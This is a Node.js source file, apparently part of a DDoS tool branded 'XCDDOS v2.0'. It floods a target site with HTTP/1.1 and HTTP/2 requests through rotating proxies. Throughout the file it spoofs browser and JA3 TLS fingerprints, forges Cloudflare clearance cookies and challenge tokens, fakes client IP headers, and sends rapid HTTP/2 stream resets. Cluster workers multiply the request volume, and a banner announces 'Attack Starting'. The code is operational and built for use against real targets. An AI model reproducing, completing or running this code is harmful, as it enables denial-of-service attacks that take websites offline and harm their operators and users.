    const selectedWebGL = webGLVendors[Math.floor(Math.random() * webGLVendors.length)];

    
    let hardwareConcurrency;
    let deviceMemory;
    let maxTouchPoints;
    let touchEvent;
    let touchStart;
    let colorDepth = 24;  
    let pixelDepth = 24;

    if (browserType === 'chrome') {
        hardwareConcurrency = isMobile ? [2, 4][Math.floor(Math.random() * 2)] : [4, 8, 12][Math.floor(Math.random() * 3)];
        deviceMemory = isMobile ? 2 : 8;
        maxTouchPoints = isMobile ? getRandomInt(1, 5) : 0;
        touchEvent = isMobile;
        touchStart = isMobile;
    } else if (browserType === 'firefox') {
        hardwareConcurrency = isMobile ? [2, 4][Math.floor(Math.random() * 2)] : [4, 6, 8][Math.floor(Math.random() * 3)];
        deviceMemory = isMobile ? 2 : 4;
        maxTouchPoints = isMobile ? getRandomInt(1, 5) : 0;
        touchEvent = isMobile;
        touchStart = isMobile;
    } else if (browserType === 'edge') {
        hardwareConcurrency = isMobile ? [2, 4][Math.floor(Math.random() * 2)] : [8, 12, 16][Math.floor(Math.random() * 3)];
        deviceMemory = isMobile ? 4 : 8;
        maxTouchPoints = isMobile ? getRandomInt(1, 5) : 0;
        touchEvent = isMobile;
        touchStart = isMobile;
    }

    const canvasSeed = crypto.createHash('md5').update(userAgent + 'canvas_seed').digest('hex');
    const canvasFingerprint = canvasSeed.substring(0, 8);
    const webglFingerprint = crypto.createHash('md5').update(selectedWebGL.vendor + selectedWebGL.renderer).digest('hex').substring(0, 8);

    const generateJA3 = () => {
        const version = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];
        const cipher = ja3Fingerprint.ciphers.join(':');
        const extension = ja3Fingerprint.extensions.join('-');
        const curve = ja3Fingerprint.curves.join('-');
        const ja3 = `${version},${cipher},${extension},${curve},0`;
        return crypto.createHash('md5').update(ja3).digest('hex');
    };

    return {
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.width,
            availHeight: screen.height - (isMobile ? 0 : getRandomInt(20, 100)),  
            colorDepth: colorDepth,
            pixelDepth: pixelDepth
        },
        navigator: {
            language: languages[Math.floor(Math.random() * languages.length)],
            languages: ['en-US', 'en'],
            doNotTrack: Math.random() > 0.7 ? "1" : "0",
            hardwareConcurrency: hardwareConcurrency,
            userAgent: userAgent,
            sextoy: sextoy,
            deviceMemory: deviceMemory,
            maxTouchPoints: maxTouchPoints,
            webdriver: false,
            cookiesEnabled: true
        },
        plugins: [
            Math.random() > 0.5 ? "PDF Viewer" : null,
            Math.random() > 0.5 ? "Chrome PDF Viewer" : null,
            Math.random() > 0.5 ? { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format" } : null,
            Math.random() > 0.3 ? { name: "Widevine Content Decryption Module", filename: "widevinecdm.dll", description: "Enables Widevine licenses for playback of HTML audio/video content" } : null
        ].filter(Boolean),
        timezone: -Math.floor(Math.random() * 12) * 60,
        webgl: {
            vendor: selectedWebGL.vendor,
            renderer: selectedWebGL.renderer,
            fingerprint: webglFingerprint
        },
        canvas: canvasFingerprint,
        userActivation: Math.random() > 0.5,
        localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
        ja3: generateJA3(),
        touchSupport: { maxTouchPoints: maxTouchPoints, touchEvent: touchEvent, touchStart: touchStart }
    };
}
function colorizeStatus(status, count) {
    const greenStatuses = ['200', '404'];
    const redStatuses = ['403', '429'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524', '500'];

    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = chalk.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = chalk.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = chalk.yellow.bold(status);
    } else {
        coloredStatus = chalk.gray.bold(status);
    }

    const underlinedCount = chalk.underline(count);

    return `${coloredStatus}: ${underlinedCount}`;
}


function go() {
    let proxyLine = proxy[~~(Math.random() * proxy.length)];
    let proxyHost, proxyPort, proxyUser, proxyPass;
    if (authProxyFlag) {
        [proxyHost, proxyPort, proxyUser, proxyPass] = proxyLine.split(':');
    } else {
        [proxyHost, proxyPort] = proxyLine.split(':');
    }

    if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
        setTimeout(go, 50);
        return;
    }

    const browserType = ['chrome', 'firefox', 'edge'][Math.floor(Math.random() * 3)];
    const profile = browserProfiles[browserType];
    const ja3Fingerprint = {
        ciphers: shuffle(profile.ciphers.slice()).slice(0, getRandomInt(8, profile.ciphers.length)),
        signatureAlgorithms: shuffle(profile.signatureAlgorithms.slice()).slice(0, getRandomInt(6, profile.signatureAlgorithms.length)),
        curves: shuffle(profile.curves.slice()),
        extensions: shuffle(profile.extensions.slice()).slice(0, getRandomInt(10, profile.extensions.length)),
        padding: Math.random() > 0.3 ? getRandomInt(0, 100) : 0
    };
    const fingerprint = generateBrowserFingerprint(browserType, ja3Fingerprint); 

    let tlsSocket;

    const netSocket = net.connect({
        host: proxyHost,
        port: Number(proxyPort),
        keepAlive: true,
        keepAliveMsecs: 10000
    }, () => {
        netSocket.once('data', () => {
            proxyConnections++;
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: ja3Fingerprint.ciphers.join(':'),
                sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
                secureOptions: 
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1 |
                    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                    crypto.constants.SSL_OP_SINGLE_DH_USE |
                    crypto.constants.SSL_OP_SINGLE_ECDH_USE,
                secure: true,
                session: crypto.randomBytes(64),
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ecdhCurve: ja3Fingerprint.curves.join(':'),
                supportedVersions: ['TLSv1.3', 'TLSv1.2'],
                supportedGroups: ja3Fingerprint.curves.join(':'),
                applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2', 'http/11'] : ['h2'],
                rejectUnauthorized: false,
                fingerprint: fingerprint,
                keepAlive: true,
                keepAliveMsecs: 10000
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    function mainH1() {  
                        const method = enableCache ? getRandomMethod() : reqmethod;
                        ////// const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                        const path = enableCache 
                                 ? url.pathname + "?cache_bust=" + Date.now()
                                 : (query ? handleQuery(query) : url.pathname);
                        const h1payl = `${method} ${path}${url.search || ''}${postdata ? `?${postdata}` : ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: ${fingerprint.navigator.userAgent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: ${fingerprint.navigator.language}\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}${hcookie ? `Cookie: ${hcookie}\r\n` : ''}${currentRefererValue ? `Referer: ${currentRefererValue}\r\n` : ''}${generateAuthorizationHeader(authValue) ? `Authorization: ${generateAuthorizationHeader(authValue)}\r\n` : ''}${customHeaders ? customHeaders.split('#').map(h => { const [n, v] = h.split(':'); return `${n.trim()}: ${v.trim()}\r\n`; }).join('') : ''}Connection: keep-alive\r\n\r\n`;
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    mainH1();
                                }, enableSleep ? 1000 / ratelimit : 0);
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }

                    mainH1();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                    return;
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);
                const frames1 = [];
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, http2Fingerprint.HEADER_TABLE_SIZE],
                        [2, http2Fingerprint.ENABLE_PUSH],
                        [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
                        [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
                        [5, http2Fingerprint.MAX_FRAME_SIZE],
                        [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
                        [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];
                frames1.push(...frames);

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type == 1) {
                            	const headers = hpack.decode(frame.payload);
                                const statusHeader = headers.find(x => x[0] === ':status');
                                if (!statusHeader) continue;

                                const status = statusHeader[1];
                                // === TỰ ĐỘNG GIẢM RATELIMIT KHI GẶP 429 ===
                                if (status === '429') {
                                	 if (enableRateLimit && !rateLimitLogged) {
                                    console.log(chalk.magentaBright.underline(`[R] - RateLimit Open Start Reducing..`));
                                    rateLimitLogged = true;
                                }
                                	 const retryAfterHeader = headers.find(h => h[0].toLowerCase() === 'retry-after');
                                     const waitTime = (parseInt(retryAfterHeader?.[1]) || 30) * 1000; // giây → ms
                                // Lưu rate gốc (ưu tiên proxyRate → ratelimit → default)
                                     const originalRate = tlsSocket.proxyRate || 
                                                                         ratelimit || 
                                                                         (randrate ? getRandomInt(1, 90) : getRandomInt(20, 30));
                                    tlsSocket.proxyRate = 90; 
                                    
                                   clearTimeout(tlsSocket.rateRecovery);
                                   tlsSocket.rateRecovery = setTimeout(() => {
                                   	   tlsSocket.proxyRate = originalRate;
                                         delete tlsSocket.rateRecovery;
                                }, waitTime);
                }                
                
                if (closeOnError && (status == 403 || status == 429)) {
                     tlsSocket.write(encodeRstStream(0));
                     tlsSocket.end(() => tlsSocket.destroy());
                    netSocket.end(() => netSocket.destroy());
                }
                                
                                if (!statuses[status])
                                    statuses[status] = 0;

                                statuses[status]++;
                            }
                            
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses['GOAWAY'])
                                            statuses['GOAWAY'] = 0;

                                        statuses['GOAWAY']++;
                                    }
                                }

                                tlsSocket.write(encodeRstStream(0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.write(Buffer.concat(frames1));
                
                function main() {  
                    if (tlsSocket.destroyed) {
                        return;
                    }
                    const requests = [];
                    // bên dưới là options randrate
                    // let localRatelimit = randrate ? getRandomInt(1, 90) : ratelimit !== undefined ? getRandomInt(20, 30) : process.argv[6];
                    // cơ chế ratelimit update + randrate gốc nhưng không ưu tiên 
                    let localRatelimit = tlsSocket.proxyRate || (randrate ? getRandomInt(1, 90) : ratelimit !== undefined ? getRandomInt(20, 30) : parseInt(process.argv[6]) || 90);
                    const startTime = Date.now();
                    const customHeadersArray = [];
                    if (customHeaders) {
                        customHeaders.split('#').forEach(header => {
                            const [name, value] = header.split(':').map(part => part?.trim());
                            if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
                        });
                    }

                    
                    const batchSize = Math.min(10, localRatelimit);  
                    for (let i = 0; i < (isFull ? batchSize : 1); i++) {
                        let randomNum = Math.floor(Math.random() * (10000 - 100 + 1) + 10000);
                        const method = enableCache ? getRandomMethod() : reqmethod;
                        //// const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                        const path = enableCache 
                                 ? url.pathname + "?cache_bust=" + Date.now()
                                 : (query ? handleQuery(query) : url.pathname);
                        const pseudoHeaders = [
                            [":method", method],
                            [":authority", url.hostname],
                            [":scheme", "https"],
                            [":path", path],
                        ];

                        const regularHeaders = generateDynamicHeaders(fingerprint).filter(a => a[1] != null);  
                        const additionalRegularHeaders = Object.entries({
                            ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
                            ...(Math.random() > 0.4 && { "dnt": "1" }),
                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                        }).filter(a => a[1] != null);

                        const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
                        shuffle(allRegularHeaders);

                        // Trong hàm main(), khoảng dòng 1116 ok e
                        const combinedHeaders = [
                             ...pseudoHeaders,
                             ...allRegularHeaders,
                             ['cookie', generateCfClearanceCookie(fingerprint)],  
                             ...generateChallengeHeaders(fingerprint),  
                             ...customHeadersArray.reduce((acc, header) => [...acc, ...Object.entries(header)], [])
                         ];

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);
                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                        const frame = Buffer.concat([encodedFrame]);
                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                            const rstStreamFrame = encodeRstStream(streamId, 8);
                            tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
                            STREAMID_RESET = 0;
                        }

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (err) {
                            tlsSocket.end(() => tlsSocket.destroy());
                            return;
                        }
                        const elapsed = Date.now() - startTime;
                        const baseDelay = (300 / batchSize) - elapsed;
                        const finalDelay = Math.max(100, baseDelay) * sleepMultiplier;
                        setTimeout(() => main(), finalDelay);
                    });
                }
                main();  
            }).on('error', () => {
                tlsSocket.destroy();
            });
        });

        let connectRequest = `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}`;
        if (authProxyFlag && proxyUser && proxyPass) {
            const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
            connectRequest += `\r\nProxy-Authorization: Basic ${auth}`;
        }
        connectRequest += `\r\n\r\n`;
        netSocket.write(connectRequest);

    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go(); });
        }
    });

    netSocket.on('error', (error) => {
        cleanup(error);
    });
    
    netSocket.on('close', () => {
        cleanup();
    });
    
    function cleanup(error) {
        if (error) {
            setTimeout(go, getRandomInt(50, 200));
        }
        if (netSocket) {
            netSocket.destroy();
        }
        if (tlsSocket) {
            tlsSocket.end();
        }
    }
}
function handleQuery(query) {
    if (query === '1') {
        return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return url.pathname + `?${randomPathSuffix}`;
    } else if (query === '3') {
        return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    }
    return url.pathname;
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 30) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;

        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {
    const workers = {};

    // console.clear();
    console.log(chalk.yellow.bold('[~] Start CZ X JSBYPASS pls wait process...'));
    
    setTimeout(() => {

        const options = process.argv.slice(8);
        const usedOptions = options.filter(opt => opt.startsWith('--'));
        const authEnabled = process.argv.includes('--auth') ? chalk.green('ON') : chalk.red('OFF');

        console.log(chalk.cyan.bold('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(chalk.magenta.bold('   H2XC | XCDDOS v2.0'));
        console.log(chalk.cyan.bold('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'));

        console.log(`${chalk.white('Target URL')}:           ${chalk.green(target)}`);
        console.log(`${chalk.white('Threads')}:              ${chalk.yellow(threads)}`);
        console.log(`${chalk.white('Proxy files')}:          ${chalk.blue(proxyfile)}`);
        console.log(`${chalk.white('Use Proxy(author)')}:    ${authEnabled}`);
        console.log(`${chalk.white('Times')}:                ${chalk.red(time + 's')}`);
        console.log(`${chalk.white('Rates(PerProxy)')}:      ${chalk.magenta(ratelimit + '/s')}\n`);

        console.log(`${chalk.white.bold('--Add Options:')}`);
        if (usedOptions.length > 0) {
            const formattedOptions = usedOptions.map(opt => {
                const clean = opt.replace(/=.*/, '');
                return chalk.cyan(clean);
            }).join(chalk.gray(' | '));
            console.log(`   ${formattedOptions}`);
        } else {
            console.log(chalk.gray('   [ 404 Not Found ]'));
        }

        console.log(chalk.cyan.bold('\n—————————————Attack Starting—————————————\n'));

        Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

        cluster.on('exit', (worker) => {
            cluster.fork({ core: worker.id % os.cpus().length });
        });

        cluster.on('message', (worker, message) => {
            workers[worker.id] = [worker, message];
        });

        if (debugMode) {
            setInterval(() => {
                let statuses = {};
                let totalConnections = 0;
                for (let w in workers) {
                    if (workers[w][0].state == 'online') {
                        for (let st of workers[w][1]) {
                            for (let code in st) {
                                if (code !== 'proxyConnections') {
                                    if (statuses[code] == null)
                                        statuses[code] = 0;
                                    statuses[code] += st[code];
                                }
                            }
                            totalConnections += st.proxyConnections || 0;
                        }
                    }
                }
                const statusString = Object.entries(statuses)
                    .map(([status, count]) => colorizeStatus(status, count))
                    .join(', ');
                console.log(`(${chalk.magenta.bold('STATUS')}) | Date: (${chalk.blue.bold(new Date().toLocaleString('en-US'))}) | Cluster: [${threads}.0/${threads}] | Status: (${statusString}) | Connections: (${chalk.cyan.bold(totalConnections)})`);
                proxyConnections = 0;
            }, 1000);
        }

        if (!connectFlag) {
            setTimeout(() => process.exit(1), time * 1000);
        }
    }, 1000);
} else {
    // Worker code
    if (connectFlag) {
        setInterval(() => {
            go();
        }, delay);
    } else {
        let consssas = 0;
        let someee = setInterval(() => {
            if (consssas < 50000) {
                consssas++;
            } else {
                clearInterval(someee);
                return;
            }
            go();
        }, delay);
    }
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift();

            statusesQ.push({ ...statuses, proxyConnections });
            statuses = {};
            proxyConnections = 0;
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}
